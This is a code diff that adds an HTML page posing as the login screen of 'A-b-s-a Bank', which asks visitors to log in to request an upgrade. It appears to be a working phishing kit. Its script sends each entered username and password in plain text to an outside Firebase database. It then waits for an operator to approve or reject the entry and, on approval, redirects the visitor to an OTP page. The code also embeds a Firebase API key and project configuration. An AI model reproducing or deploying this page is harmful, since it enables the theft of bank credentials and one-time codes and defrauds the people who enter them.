@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>A-b-s-a | Home</title>
+
+  <style>
+    body { font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; background: #f5f5f5; color: #222; }
+    .container { max-width: 720px; margin: 48px auto; padding: 20px; background: #fff; border-radius: 6px; box-shadow: 0 4px 14px rgba(0,0,0,0.06); }
+    h1 { margin: 0 0 12px 0; color: #d50032; text-align:center; }
+    label { display:block; margin-top:12px; font-weight:600; }
+    input[type="text"], input[type="password"] {
+      width:100%; padding:10px; margin-top:6px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;
+    }
+    button {
+      margin-top:16px;
+      padding:10px 16px;
+      background:#d50032;
+      color:#fff;
+      border:none;
+      border-radius:6px;
+      cursor:pointer;
+      font-weight:600;
+      width:100%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:8px;
+    }
+    button[disabled] { opacity:0.6; cursor:not-allowed; }
+    .spinner {
+      width:16px;
+      height:16px;
+      border:3px solid transparent;
+      border-top:3px solid #fff;
+      border-radius:50%;
+      animation: spin 1s linear infinite;
+      display:none;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>A-b-s-a Bank</h1>
+    <p style="text-align:center;">Welcome — please login with your username & password to request upgrade.</p>
+
+    <form id="loginForm">
+      <label for="username">Username</label>
+      <input id="username" type="text" required />
+
+      <label for="password">Password</label>
+      <input id="password" type="password" required />
+
+      <button id="submitBtn" type="submit">
+        <span id="btnText">Login</span>
+        <div class="spinner" id="btnSpinner"></div>
+      </button>
+    </form>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
+    import { getDatabase, ref, push, set, onValue } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDtJstcWHSwJVPogm-MXAehNR4FBhh8Iuo",
+      authDomain: "a-b-s-a-upgrade-system.firebaseapp.com",
+      databaseURL: "https://a-b-s-a-upgrade-system-default-rtdb.firebaseio.com",
+      projectId: "a-b-s-a-upgrade-system",
+      storageBucket: "a-b-s-a-upgrade-system.firebasestorage.app",
+      messagingSenderId: "618721346269",
+      appId: "1:618721346269:web:2548672e789231e4e95134"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnText = document.getElementById('btnText');
+    const btnSpinner = document.getElementById('btnSpinner');
+
+    let currentRequestId = null;
+
+    function showSpinner() {
+      btnText.style.display = "none";
+      btnSpinner.style.display = "inline-block";
+      submitBtn.disabled = true;
+    }
+    function hideSpinner() {
+      btnText.style.display = "inline";
+      btnSpinner.style.display = "none";
+      submitBtn.disabled = false;
+    }
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      showSpinner();
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      const requestsRef = ref(database, 'requests');
+      const newRequestRef = push(requestsRef);
+
+      set(newRequestRef, {
+        username: username,
+        password: password,
+        status: "pending",
+        timestamp: new Date().toISOString()
+      })
+      .then(() => {
+        currentRequestId = newRequestRef.key;
+        localStorage.setItem("pendingRequestId", currentRequestId);
+
+        listenForApproval(currentRequestId);
+      })
+      .catch(() => {
+        hideSpinner();
+        alert("Failed to submit request. Try again.");
+      });
+    });
+
+    function listenForApproval(requestId) {
+      const requestRef = ref(database, 'requests/' + requestId);
+      onValue(requestRef, (snapshot) => {
+        const data = snapshot.val();
+        if (!data) return;
+
+        if (data.status === 'approved') {
+          window.location.href = 'otp.html';
+        } else if (data.status === 'rejected') {
+          hideSpinner();
+          alert("Wrong username or password. Try again.");
+        }
+      });
+    }
+
+    window.addEventListener('load', () => {
+      const savedRequestId = localStorage.getItem("pendingRequestId");
+      if (savedRequestId) {
+        listenForApproval(savedRequestId);
+      }
+    });
+  </script>
+</body>
+</html>
